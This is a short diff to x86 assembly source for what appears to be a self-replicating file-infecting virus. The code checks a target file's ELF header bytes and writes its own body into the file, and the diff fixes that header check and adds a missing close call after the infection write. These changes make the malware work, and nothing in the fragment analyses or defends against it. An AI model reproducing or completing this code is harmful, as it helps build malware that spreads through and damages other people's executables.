@@ -77,7 +77,7 @@ _start:	push	ebp
 	mov ecx, ebp
 	sub ecx,200
 	read dword [ebp-8],	ecx,4
-	cmp byte [ecx+1],0x4C
+	cmp byte [ecx+1],0x45
 	jne .error2
 	cmp byte [ecx+2],0x4C
 	jne .error2
@@ -90,6 +90,7 @@ _start:	push	ebp
 		call get_my_loc
 		add dword [ebp-4], (my_start-anchor)
 		write dword [ebp-8],dword [ebp-4],(virus_end-my_start)
+		close dword [ebp-8]
 		jmp VirusExit
 	.error1:
 		call get_my_loc
